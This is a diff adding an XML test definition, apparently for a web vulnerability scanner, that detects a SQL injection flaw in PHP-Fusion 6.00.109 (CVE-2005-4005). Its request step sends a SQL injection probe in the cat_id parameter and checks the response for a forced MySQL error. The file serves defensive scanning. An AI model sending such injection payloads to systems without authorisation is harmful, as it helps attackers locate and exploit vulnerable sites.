@@ -1,0 +1,101 @@
+<?xml version="1.0" encoding="utf-8"?>
+<WebApplicationTest>
+	<TestDescription name="PHP-Fusion 6.00.109 SQL injection" version="6.00.109" released="20051016" updated="20140304" protocol="HTTP" mayproxy="true" affects="file" severity="high" alert="success" type="Validation">
+		<WASPDescription BindAlertToFile="0" CrawlerProcessingMode="ParseOnly" TargetFormat="${file}" Target="" ModuleName="Backup files" Request="" Response="" FullResponse="" DetailsFormat="The script has been tested with these parameter values : ${combinations}" Details="" AuthType="0" AuthName="" AuthPass="" CompInfo="" FolowRedirection="false" DetaliedInformation="" AlertTags="known_vulnerabilities,sql_injection" SendCookies="true" CVE="CVE-2005-4005" CWE="CWE-89" CVSSVer="2.0" CVSSScore="7.5" CVSSDescr="AV:N/AC:L/Au:N/C:P/I:P/A:P/E:POC/RL:OF/RC:C" CVSSScoreTemp="5.9" CVSSScoreEnv="5.9" CVSS3Descr="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N"></WASPDescription>
+		<Reference database="Secunia SA17055" URL="http://secunia.com/advisories/17055/"></Reference>
+		<Reference database="Secunia SA17871" URL="http://secunia.com/advisories/17871/"></Reference>
+		<Reference database="PHP-Fusion Home Page" URL="http://www.php-fusion.co.uk/"></Reference>
+		<Copyright></Copyright>
+		<Description>1. Input passed to the "activate" parameter in "register.php" and the "cat_id" parameter in "faq.php" isn't properly sanitised before being used in a SQL query. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+[break]
+[break]
+2. Input passed to the "srch_text" parameter in "messages.php" isn't properly sanitised before being used in a SQL query. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+[break][break]
+[navy]Confirmed in version 6.00.109.  Other versions may also be affected.[/navy]</Description>
+		<ApplicableTo>
+			<Platform>
+				<OS>All</OS>
+				<Arch>i386</Arch>
+			</Platform>
+			<WebServer>All</WebServer>
+			<ApplicationServer>PHP</ApplicationServer>
+		</ApplicableTo>
+		<TriggerOn event="scheme_host_port">
+			<Match type="regex">http://.*</Match>
+		</TriggerOn>
+		<Impact>The remote attacker can manipulate SQL queries by injecting arbitrary SQL code.</Impact>
+		<Recommendation>Update to version 6.00.110 or higher.</Recommendation>
+	</TestDescription>
+	<Connection scheme="${scheme}" host="${host}" port="${port}">
+		<Step name="testfile">
+			<Request>
+				<MessageHeader>
+					<Method>GET</Method>
+					<URI>${scheme}://${host}:${port}${path}?cat_id=1%27%20or%20force_mysql_error%3D%272</URI>
+					<Version>HTTP/1.0</Version>
+				</MessageHeader>
+				<MessageBody>
+					<Separator></Separator>
+				</MessageBody>
+			</Request>
+			<Response>
+				<SetVariable name="ResponseCode" type="string">
+					<Description>The HTTP Response Code</Description>
+					<Source source="status">^.*\s(\d\d\d)\s</Source>
+				</SetVariable>
+				<SetVariable name="FullBody" type="string">
+					<Description>The HTTP Response Code</Description>
+					<Source source="body">^(.*)$</Source>
+				</SetVariable>
+				<SetVariable name="body404" type="string">
+					<Description>See if we got a custom error page, incorrectly implemented with a return code of 200</Description>
+					<Source source="body">${Custom404Strings}</Source>
+				</SetVariable>
+				<SetVariable name="redir302" type="string">
+					<Description>Check to see if we are being redirected to another page</Description>
+					<Source source="header">^Location: (.*)$</Source>
+				</SetVariable>
+				<SetVariable name="mysql_error" type="string">
+					<Description>find error Unknown column</Description>
+					<Source source="body">(Unknown\scolumn\s\'force_mysql_error\'\sin\s\'where\sclause)</Source>
+				</SetVariable>
+			</Response>
+			<TestCriteria type="success">
+				<Compare variable="${ResponseCode}" test="neq">
+					<Value>400</Value>
+					<Compare variable="${body404}" test="eq">
+						<Value></Value>
+						<Compare variable="${mysql_error}" test="cont">
+							<Value>force_mysql_error</Value>
+							<Compare variable="${ResponseCode}" test="eq">
+								<Value>200</Value>
+							</Compare>
+						</Compare>
+					</Compare>
+				</Compare>
+			</TestCriteria>
+			<TestCriteria type="failure">
+				<Compare variable="${ResponseCode}" test="eq">
+					<Value>404</Value>
+				</Compare>
+			</TestCriteria>
+			<TestCriteria type="failure">
+				<Compare variable="${IsCustom404}" test="eq">
+					<Value>true</Value>
+				</Compare>
+			</TestCriteria>
+		</Step>
+	</Connection>
+	<Variable name="file" type="string">
+		<Description>Site file to be tested</Description>
+		<Item encoding="Text">test</Item>
+	</Variable>
+	<Variable name="test" type="string">
+		<Description>A list of tests to be performed</Description>
+		<Item encoding="Text">test</Item>
+	</Variable>
+	<Variable name="path" type="string">
+		<Description>List of complete tests</Description>
+		<Item encoding="Text">${file}${test}</Item>
+	</Variable>
+</WebApplicationTest>
